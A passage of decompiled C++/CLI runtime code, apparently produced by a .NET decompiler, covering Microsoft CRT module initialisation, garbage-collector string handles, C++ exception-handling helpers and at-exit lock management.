    \u003CModule\u003E.\u003FInitializedPerAppDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2W4State\u0040Progress\u00402\u0040A = (Progress.State) 2;
  }

  [SecurityCritical]
  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializeUninitializer(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0, "The C++ module failed to load during registration for the unload events.\n");
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ERegisterModuleUninitializer(new EventHandler(\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EDomainUnload));
  }

  [SecurityCritical]
  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E_Initialize(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.\u003FIsDefaultDomain\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2_NA = AppDomain.CurrentDomain.IsDefaultAppDomain();
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializeVtables(obj0);
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializePerAppDomain(obj0);
    \u003CModule\u003E.\u003FInitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA = 1;
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitializeUninitializer(obj0);
  }

  [SecurityCritical]
  internal static void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EUninitializeAppDomain() => \u003CModule\u003E._app_exit_callback();

  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [SecurityCritical]
  [PrePrepareMethod]
  internal static void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EDomainUnload(
    object source,
    EventArgs arguments)
  {
    if (\u003CModule\u003E.\u003FInitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA == 0 || Interlocked.Exchange(ref \u003CModule\u003E.\u003FUninitialized\u0040CurrentDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q2HA, 1) != 0)
      return;
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EUninitializeAppDomain();
  }

  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [DebuggerStepThrough]
  [SecurityCritical]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002ECleanup(
    [In] LanguageSupport* obj0,
    Exception innerException)
  {
    object obj = (object) null;
    try
    {
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EUninitializeAppDomain();
    }
    catch (Exception ex)
    {
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EThrowNestedModuleLoadException(innerException, ex);
    }
    catch (object ex)
    {
      obj = ex;
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EThrowNestedModuleLoadException(innerException, (Exception) null);
    }
  }

  [SecurityCritical]
  internal static unsafe LanguageSupport* \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E\u007Bctor\u007D(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u007Bctor\u007D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0);
    return obj0;
  }

  [SecurityCritical]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E\u007Bdtor\u007D(
    [In] LanguageSupport* obj0)
  {
    \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u007Bdtor\u007D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0);
  }

  [DebuggerStepThrough]
  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [SecurityCritical]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitialize(
    [In] LanguageSupport* obj0)
  {
    object obj = (object) null;
    try
    {
      \u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0, "The C++ module failed to load.\n");
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E_Initialize(obj0);
    }
    catch (Exception ex)
    {
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002ECleanup(obj0, ex);
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EThrowModuleLoadException(\u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u002EP\u0024AAVString\u0040System\u0040\u0040((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0), ex);
    }
    catch (object ex)
    {
      obj = ex;
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002ECleanup(obj0, (Exception) null);
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EThrowModuleLoadException(\u003CModule\u003E.gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u002EP\u0024AAVString\u0040System\u0040\u0040((gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E*) obj0), (Exception) null);
    }
  }

  [DebuggerStepThrough]
  [SecurityCritical]
  static unsafe \u003CModule\u003E()
  {
    LanguageSupport languageSupport;
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E\u007Bctor\u007D(&languageSupport);
    // ISSUE: fault handler
    try
    {
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002EInitialize(&languageSupport);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E\u007Bdtor\u007D), (void*) &languageSupport);
    }
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002ELanguageSupport\u002E\u007Bdtor\u007D(&languageSupport);
  }

  [DebuggerStepThrough]
  [SecuritySafeCritical]
  internal static unsafe gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E* gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u007Bctor\u007D(
    [In] gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E* obj0)
  {
    IntPtr num = (IntPtr) GCHandle.Alloc((object) null);
    *(int*) obj0 = (int) num.ToPointer();
    return obj0;
  }

  [DebuggerStepThrough]
  [SecurityCritical]
  internal static unsafe void gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u007Bdtor\u007D(
    [In] gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E* obj0)
  {
    ((GCHandle) new IntPtr((void*) *(int*) obj0)).Free();
    *(int*) obj0 = 0;
  }

  [SecurityCritical]
  [DebuggerStepThrough]
  internal static unsafe gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E* gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u003D(
    [In] gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E* obj0,
    string t)
  {
    ((GCHandle) new IntPtr((void*) *(int*) obj0)).Target = (object) t;
    return obj0;
  }

  [SecuritySafeCritical]
  internal static unsafe string gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E\u002E\u002EP\u0024AAVString\u0040System\u0040\u0040(
    [In] gcroot\u003CSystem\u003A\u003AString\u0020\u005E\u003E* obj0)
  {
    return (string) ((GCHandle) new IntPtr((void*) *(int*) obj0)).Target;
  }

  [SecurityCritical]
  [HandleProcessCorruptedStateExceptions]
  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [SecurityPermission(SecurityAction.Assert, UnmanagedCode = true)]
  internal static void \u003FA0x0f573672\u002E__DestructExceptionObject_m(
    EHExceptionRecord* pExcept,
    byte fThrowNotAllowed)
  {
    // ISSUE: unable to decompile the method.
  }

  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [SecurityCritical]
  internal static unsafe int ___CxxExceptionFilter(
    void* ppExcept,
    void* pType,
    int adjectives,
    void* pBuildObj)
  {
    int num1;
    if ((IntPtr) ppExcept == IntPtr.Zero)
    {
      num1 = 0;
    }
    else
    {
      EHExceptionRecord* pExcept = (EHExceptionRecord*) *(int*) ppExcept;
      if (((IntPtr) pType == IntPtr.Zero || *(sbyte*) ((IntPtr) pType + 8 + 1 * 0) == (sbyte) 0) && (*(int*) pExcept == -532459699 || *(int*) pExcept == -532462766 || (adjectives & 64) == 0))
      {
        if (*(int*) pExcept == -529697949 && *(int*) ((IntPtr) pExcept + 16) == 3 && (*(int*) ((IntPtr) pExcept + 20) == 26820608 || *(int*) ((IntPtr) pExcept + 28) == 0) && *(int*) ((IntPtr) pExcept + 28) == 0 && *(int*) ((IntPtr) \u003CModule\u003E._getptd() + 136) == 0)
        {
          num1 = 0;
        }
        else
        {
          IntPtr num2 = (IntPtr) \u003CModule\u003E._getptd() + 144;
          *(int*) num2 = *(int*) num2 + 1;
          num1 = 1;
        }
      }
      else
      {
        if (*(int*) pExcept == -529697949 && *(int*) ((IntPtr) pExcept + 16) == 3 && (*(int*) ((IntPtr) pExcept + 20) == 26820608 || *(int*) ((IntPtr) pExcept + 28) == 0))
        {
          if (*(int*) ((IntPtr) pExcept + 28) == 0)
          {
            if (*(int*) ((IntPtr) \u003CModule\u003E._getptd() + 136) == 0)
            {
              num1 = 0;
              goto label_19;
            }
            else
              pExcept = (EHExceptionRecord*) *(int*) ((IntPtr) \u003CModule\u003E._getptd() + 136);
          }
          _s_HandlerType sHandlerType;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ((IntPtr) &sHandlerType + 4) = (int) pType;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ref sHandlerType = adjectives;
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          // ISSUE: cast to a reference type
          // ISSUE: explicit reference operation
          ^(int&) ref sHandlerType = ^(int&) ref sHandlerType | int.MinValue;
          _s_CatchableType** sCatchableTypePtr1 = (_s_CatchableType**) (*(int*) (*(int*) ((IntPtr) pExcept + 28) + 12) + 4);
          int num3 = *(int*) *(int*) (*(int*) ((IntPtr) pExcept + 28) + 12);
          while (num3 > 0)
          {
            _s_CatchableType* sCatchableTypePtr2 = (_s_CatchableType*) *(int*) sCatchableTypePtr1;
            if (\u003CModule\u003E.\u003FA0x0f573672\u002ETypeMatch\u003Cstruct\u0020_s_HandlerType\u002Cstruct\u0020_s_CatchableType\u0020const\u0020\u002Cstruct\u0020_s_ThrowInfo\u0020const\u0020\u003E(&sHandlerType, sCatchableTypePtr2, (_s_ThrowInfo*) *(int*) ((IntPtr) pExcept + 28)) == 0)
            {
              --num3;
              sCatchableTypePtr1 += 4;
            }
            else
            {
              IntPtr num4 = (IntPtr) \u003CModule\u003E._getptd() + 144;
              *(int*) num4 = *(int*) num4 + 1;
              if ((IntPtr) pBuildObj != IntPtr.Zero)
                \u003CModule\u003E.\u003FA0x0f573672\u002EBuildCatchObject\u003Cstruct\u0020_s_HandlerType\u002Cstruct\u0020_s_CatchableType\u0020const\u0020\u003E(pExcept, pBuildObj, &sHandlerType, sCatchableTypePtr2);
              num1 = 1;
              goto label_19;
            }
          }
        }
        num1 = 0;
      }
    }
label_19:
    return num1;
  }

  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [SecurityCritical]
  [SecurityPermission(SecurityAction.Assert, UnmanagedCode = true)]
  internal static unsafe int ___CxxRegisterExceptionObject(void* ppExcept, void* pStorage)
  {
    FrameInfo* frameInfoPtr = (FrameInfo*) pStorage;
    EHExceptionRecord** ehExceptionRecordPtr1 = (EHExceptionRecord**) ((IntPtr) frameInfoPtr + 8);
    _CONTEXT** contextPtr = (_CONTEXT**) ((IntPtr) ehExceptionRecordPtr1 + 4);
    if ((IntPtr) ppExcept != IntPtr.Zero && *(int*) ppExcept != 0)
    {
      EHExceptionRecord* ehExceptionRecordPtr2 = (EHExceptionRecord*) *(int*) ppExcept;
      if (*(int*) ehExceptionRecordPtr2 == -529697949 && *(int*) ((IntPtr) ehExceptionRecordPtr2 + 16) == 3 && (*(int*) ((IntPtr) ehExceptionRecordPtr2 + 20) == 26820608 || *(int*) ((IntPtr) ehExceptionRecordPtr2 + 28) == 0) && *(int*) ((IntPtr) ehExceptionRecordPtr2 + 28) == 0)
        ehExceptionRecordPtr2 = (EHExceptionRecord*) *(int*) ((IntPtr) \u003CModule\u003E._getptd() + 136);
      \u003CModule\u003E._CreateFrameInfo(frameInfoPtr, (void*) *(int*) ((IntPtr) ehExceptionRecordPtr2 + 24));
      *(int*) ehExceptionRecordPtr1 = *(int*) ((IntPtr) \u003CModule\u003E._getptd() + 136);
      *(int*) contextPtr = *(int*) ((IntPtr) \u003CModule\u003E._getptd() + 140);
      *(int*) ((IntPtr) \u003CModule\u003E._getptd() + 136) = (int) ehExceptionRecordPtr2;
    }
    else
    {
      *(int*) ehExceptionRecordPtr1 = -1;
      *(int*) contextPtr = -1;
    }
    IntPtr num = (IntPtr) \u003CModule\u003E._getptd() + 144;
    *(int*) num = *(int*) num - 1;
    if (*(int*) ((IntPtr) \u003CModule\u003E._getptd() + 144) < 0)
      *(int*) ((IntPtr) \u003CModule\u003E._getptd() + 144) = 0;
    return 1;
  }

  [SecurityCritical]
  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  internal static unsafe int ___CxxDetectRethrow(void* ppExcept)
  {
    int num1;
    if ((IntPtr) ppExcept == IntPtr.Zero)
    {
      num1 = 0;
    }
    else
    {
      EHExceptionRecord* ehExceptionRecordPtr = (EHExceptionRecord*) *(int*) ppExcept;
      if (*(int*) ehExceptionRecordPtr == -529697949 && *(int*) ((IntPtr) ehExceptionRecordPtr + 16) == 3 && (*(int*) ((IntPtr) ehExceptionRecordPtr + 20) == 26820608 || *(int*) ((IntPtr) ehExceptionRecordPtr + 28) == 0) && *(int*) ((IntPtr) ehExceptionRecordPtr + 28) == 0)
      {
        IntPtr num2 = (IntPtr) \u003CModule\u003E._getptd() + 144;
        *(int*) num2 = *(int*) num2 + 1;
        num1 = 1;
      }
      else
        num1 = 0;
    }
    return num1;
  }

  [SecurityCritical]
  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [SecurityPermission(SecurityAction.Assert, UnmanagedCode = true)]
  internal static unsafe void ___CxxUnregisterExceptionObject(void* pStorage, int rethrow)
  {
    FrameInfo* frameInfoPtr = (FrameInfo*) pStorage;
    EHExceptionRecord** ehExceptionRecordPtr = (EHExceptionRecord**) ((IntPtr) frameInfoPtr + 8);
    _CONTEXT** contextPtr = (_CONTEXT**) ((IntPtr) ehExceptionRecordPtr + 4);
    if (*(int*) ehExceptionRecordPtr == -1)
      return;
    \u003CModule\u003E._FindAndUnlinkFrame(frameInfoPtr);
    if (rethrow == 0 && *(int*) *(int*) ((IntPtr) \u003CModule\u003E._getptd() + 136) == -529697949 && *(int*) (*(int*) ((IntPtr) \u003CModule\u003E._getptd() + 136) + 16) == 3 && (*(int*) (*(int*) ((IntPtr) \u003CModule\u003E._getptd() + 136) + 20) == 26820608 || *(int*) (*(int*) ((IntPtr) \u003CModule\u003E._getptd() + 136) + 28) == 0) && \u003CModule\u003E._IsExceptionObjectToBeDestroyed((void*) *(int*) (*(int*) ((IntPtr) \u003CModule\u003E._getptd() + 136) + 24)) != 0)
      \u003CModule\u003E.\u003FA0x0f573672\u002E__DestructExceptionObject_m((EHExceptionRecord*) *(int*) ((IntPtr) \u003CModule\u003E._getptd() + 136), (byte) 1);
    if (*(int*) *(int*) ((IntPtr) \u003CModule\u003E._getptd() + 136) == -529697949 && *(int*) (*(int*) ((IntPtr) \u003CModule\u003E._getptd() + 136) + 16) == 3 && (*(int*) (*(int*) ((IntPtr) \u003CModule\u003E._getptd() + 136) + 20) == 26820608 || *(int*) (*(int*) ((IntPtr) \u003CModule\u003E._getptd() + 136) + 28) == 0) && rethrow != 0)
    {
      IntPtr num = (IntPtr) \u003CModule\u003E._getptd() + 144;
      *(int*) num = *(int*) num - 1;
    }
    *(int*) ((IntPtr) \u003CModule\u003E._getptd() + 136) = *(int*) ehExceptionRecordPtr;
    *(int*) ((IntPtr) \u003CModule\u003E._getptd() + 140) = *(int*) contextPtr;
  }

  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  internal static int ___CxxQueryExceptionSize() => 16;

  [HandleProcessCorruptedStateExceptions]
  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [SecurityCritical]
  [SecurityPermission(SecurityAction.Assert, UnmanagedCode = true)]
  internal static unsafe void ___CxxCallUnwindDtor(__FnPtr<void (void*)> pDtor, void* pThis)
  {
    try
    {
      void* voidPtr = pThis;
      // ISSUE: function pointer call
      __calli(pDtor)(voidPtr);
    }
    catch (Exception ex) when (\u003CModule\u003E.__FrameUnwindFilter((_EXCEPTION_POINTERS*) Marshal.GetExceptionPointers()) != 0)
    {
    }
  }

  [SecuritySafeCritical]
  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [SecurityPermission(SecurityAction.Assert, UnmanagedCode = true)]
  internal static unsafe int \u003FA0x0f573672\u002ETypeMatch\u003Cstruct\u0020_s_HandlerType\u002Cstruct\u0020_s_CatchableType\u0020const\u0020\u002Cstruct\u0020_s_ThrowInfo\u0020const\u0020\u003E(
    _s_HandlerType* pCatch,
    _s_CatchableType* pCatchable,
    _s_ThrowInfo* pThrow)
  {
    return *(int*) ((IntPtr) pCatch + 4) == 0 || *(sbyte*) (*(int*) ((IntPtr) pCatch + 4) + 8 + 1 * 0) == (sbyte) 0 ? 1 : (*(int*) ((IntPtr) pCatch + 4) == *(int*) ((IntPtr) pCatchable + 4) || \u003CModule\u003E.strcmp((sbyte*) (*(int*) ((IntPtr) pCatch + 4) + 8), (sbyte*) (*(int*) ((IntPtr) pCatchable + 4) + 8)) == 0 ? ((*(int*) pCatchable & 2) != 0 && (*(int*) pCatch & 8) == 0 || (*(int*) pThrow & 1) != 0 && (*(int*) pCatch & 1) == 0 || (*(int*) pThrow & 2) != 0 && (*(int*) pCatch & 2) == 0 ? 0 : 1) : 0);
  }

  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [SecurityCritical]
  [HandleProcessCorruptedStateExceptions]
  [SecurityPermission(SecurityAction.Assert, UnmanagedCode = true)]
  internal static unsafe void \u003FA0x0f573672\u002EBuildCatchObject\u003Cstruct\u0020_s_HandlerType\u002Cstruct\u0020_s_CatchableType\u0020const\u0020\u003E(
    EHExceptionRecord* pExcept,
    void* pRN,
    _s_HandlerType* pCatch,
    _s_CatchableType* pConv)
  {
    void** voidPtr = (void**) pRN;
    if ((*(int*) pCatch & int.MinValue) == 0)
      \u003CModule\u003E._inconsistency();
    try
    {
      switch (\u003CModule\u003E.\u003FA0x0f573672\u002EBuildCatchObjectHelper\u003Cstruct\u0020_s_HandlerType\u002Cstruct\u0020_s_CatchableType\u0020const\u0020\u003E(pExcept, pRN, pCatch, pConv))
      {
        case 1:
          // ISSUE: cast to a function pointer type
          // ISSUE: function pointer call
          __calli((__FnPtr<void (void*, void*)>) *(int*) ((IntPtr) pConv + 24))((void*) voidPtr, \u003CModule\u003E.__AdjustPointer((void*) *(int*) ((IntPtr) pExcept + 24), (PMD*) ((IntPtr) pConv + 8)));
          break;
        case 2:
          // ISSUE: cast to a function pointer type
          // ISSUE: function pointer call
          __calli((__FnPtr<void (void*, void*, int)>) *(int*) ((IntPtr) pConv + 24))((int) voidPtr, \u003CModule\u003E.__AdjustPointer((void*) *(int*) ((IntPtr) pExcept + 24), (PMD*) ((IntPtr) pConv + 8)), (void*) 1);
          break;
      }
    }
    catch (Exception ex) when (true)
    {
      \u003CModule\u003E.terminate();
    }
  }

  [SecurityCritical]
  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [HandleProcessCorruptedStateExceptions]
  [SecurityPermission(SecurityAction.Assert, UnmanagedCode = true)]
  internal static unsafe int \u003FA0x0f573672\u002EBuildCatchObjectHelper\u003Cstruct\u0020_s_HandlerType\u002Cstruct\u0020_s_CatchableType\u0020const\u0020\u003E(
    EHExceptionRecord* pExcept,
    void* pRN,
    _s_HandlerType* pCatch,
    _s_CatchableType* pConv)
  {
    int num1 = 0;
    int num2;
    if (*(int*) ((IntPtr) pCatch + 4) == 0 || *(sbyte*) (*(int*) ((IntPtr) pCatch + 4) + 8 + 1 * 0) == (sbyte) 0 || *(int*) ((IntPtr) pCatch + 8) == 0 && (*(int*) pCatch & int.MinValue) == 0)
    {
      num2 = 0;
    }
    else
    {
      if ((*(int*) pCatch & int.MinValue) == 0)
        \u003CModule\u003E._inconsistency();
      void** voidPtr1 = (void**) pRN;
      try
      {
        if ((*(int*) pCatch & 8) != 0)
        {
          if (\u003CModule\u003E._ValidateRead((void*) *(int*) ((IntPtr) pExcept + 24), 1U) != 0 && \u003CModule\u003E._ValidateWrite((void*) voidPtr1, 1U) != 0)
          {
            *(int*) voidPtr1 = *(int*) ((IntPtr) pExcept + 24);
            void** voidPtr2 = voidPtr1;
            void* voidPtr3 = \u003CModule\u003E.__AdjustPointer((void*) *(int*) voidPtr2, (PMD*) ((IntPtr) pConv + 8));
            *(int*) voidPtr2 = (int) voidPtr3;
          }
          else
            \u003CModule\u003E._inconsistency();
        }
        else if ((*(int*) pConv & 1) != 0)
        {
          if (\u003CModule\u003E._ValidateRead((void*) *(int*) ((IntPtr) pExcept + 24), 1U) != 0 && \u003CModule\u003E._ValidateWrite((void*) voidPtr1, 1U) != 0)
          {
            \u003CModule\u003E.memmove((void*) voidPtr1, (void*) *(int*) ((IntPtr) pExcept + 24), (uint) *(int*) ((IntPtr) pConv + 20));
            if (*(int*) ((IntPtr) pConv + 20) == 4)
            {
              if (*(int*) voidPtr1 != 0)
              {
                void** voidPtr4 = voidPtr1;
                void* voidPtr5 = \u003CModule\u003E.__AdjustPointer((void*) *(int*) voidPtr4, (PMD*) ((IntPtr) pConv + 8));
                *(int*) voidPtr4 = (int) voidPtr5;
              }
            }
          }
          else
            \u003CModule\u003E._inconsistency();
        }
        else if (*(int*) ((IntPtr) pConv + 24) == 0)
        {
          if (\u003CModule\u003E._ValidateRead((void*) *(int*) ((IntPtr) pExcept + 24), 1U) != 0 && \u003CModule\u003E._ValidateWrite((void*) voidPtr1, 1U) != 0)
            \u003CModule\u003E.memmove((void*) voidPtr1, \u003CModule\u003E.__AdjustPointer((void*) *(int*) ((IntPtr) pExcept + 24), (PMD*) ((IntPtr) pConv + 8)), (uint) *(int*) ((IntPtr) pConv + 20));
          else
            \u003CModule\u003E._inconsistency();
        }
        else
        {
          // ISSUE: cast to a function pointer type
          if (\u003CModule\u003E._ValidateRead((void*) *(int*) ((IntPtr) pExcept + 24), 1U) != 0 && \u003CModule\u003E._ValidateWrite((void*) voidPtr1, 1U) != 0 && \u003CModule\u003E._ValidateExecute((__FnPtr<int ()>) *(int*) ((IntPtr) pConv + 24)) != 0)
            num1 = (*(int*) pConv & 4) == 0 ? 1 : 2;
          else
            \u003CModule\u003E._inconsistency();
        }
      }
      catch (Exception ex) when (true)
      {
        \u003CModule\u003E.terminate();
      }
      num2 = num1;
    }
    return num2;
  }

  [SuppressUnmanagedCodeSecurity]
  [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
  [DllImport("msvcr110D.dll", CallingConvention = CallingConvention.Cdecl)]
  public static extern unsafe _tiddata* _getptd();

  [SecurityCritical]
  [DebuggerStepThrough]
  internal static unsafe ValueType \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_handle() => (IntPtr) \u003CModule\u003E.\u003F_lock\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0PAXA == IntPtr.Zero ? (ValueType) null : (ValueType) GCHandle.FromIntPtr(new IntPtr(\u003CModule\u003E.\u003F_lock\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0PAXA));

  [SecurityCritical]
  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Construct(
    object value)
  {
    \u003CModule\u003E.\u003F_lock\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0PAXA = (void*) 0;
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Set(value);
  }

  [DebuggerStepThrough]
  [SecurityCritical]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Set(
    object value)
  {
    ValueType valueType = \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_handle();
    if (valueType == null)
      \u003CModule\u003E.\u003F_lock\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0PAXA = GCHandle.ToIntPtr(GCHandle.Alloc(value)).ToPointer();
    else
      ((GCHandle) valueType).Target = value;
  }

  [DebuggerStepThrough]
  [SecurityCritical]
  internal static object \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Get()
  {
    ValueType valueType = \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_handle();
    return valueType == null ? (object) null : ((GCHandle) valueType).Target;
  }

  [SecurityCritical]
  [DebuggerStepThrough]
  internal static unsafe void \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Destruct()
  {
    ValueType valueType = \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_handle();
    if (valueType == null)
      return;
    ((GCHandle) valueType).Free();
    \u003CModule\u003E.\u003F_lock\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0PAXA = (void*) 0;
  }

  [SecuritySafeCritical]
  [DebuggerStepThrough]
  [return: MarshalAs(UnmanagedType.U1)]
  internal static bool \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EIsInitialized() => \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Get() != null;

  [SecurityCritical]
  [DebuggerStepThrough]
  internal static void \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EAddRef()
  {
    if (!\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EIsInitialized())
    {
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Construct(new object());
      \u003CModule\u003E.\u003F_ref_count\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0HA = 0;
    }
    ++\u003CModule\u003E.\u003F_ref_count\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0HA;
  }

  [SecurityCritical]
  [DebuggerStepThrough]
  internal static void \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002ERemoveRef()
  {
    Debug.Assert(\u003CModule\u003E.\u003F_ref_count\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0HA > 0, "Reference count must be greater than zero");
    --\u003CModule\u003E.\u003F_ref_count\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0HA;
    if (\u003CModule\u003E.\u003F_ref_count\u0040AtExitLock\u0040\u003CCrtImplementationDetails\u003E\u0040\u0040\u0024\u0024Q0HA != 0)
      return;
    Debug.Assert(\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EIsInitialized(), "Lock must be initialized");
    \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Destruct();
  }

  [DebuggerStepThrough]
  [SecurityCritical]
  internal static void \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EEnter() => Monitor.Enter(\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Get());

  [DebuggerStepThrough]
  [SecurityCritical]
  internal static void \u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EExit() => Monitor.Exit(\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002E_lock_Get());

  [DebuggerStepThrough]
  [SecurityCritical]
  [return: MarshalAs(UnmanagedType.U1)]
  internal static bool \u003FA0x9fef5dfa\u002E__global_lock()
  {
    bool flag = false;
    if (\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EIsInitialized())
    {
      \u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EEnter();
      flag = true;
    }
    return flag;
  }

  [DebuggerStepThrough]
  [SecurityCritical]
  [return: MarshalAs(UnmanagedType.U1)]
  internal static bool \u003FA0x9fef5dfa\u002E__global_unlock()
  {
    bool flag = false;
    if (\u003CModule\u003E.\u003CCrtImplementationDetails\u003E\u002EAtExitLock\u002EIsInitialized())
    {
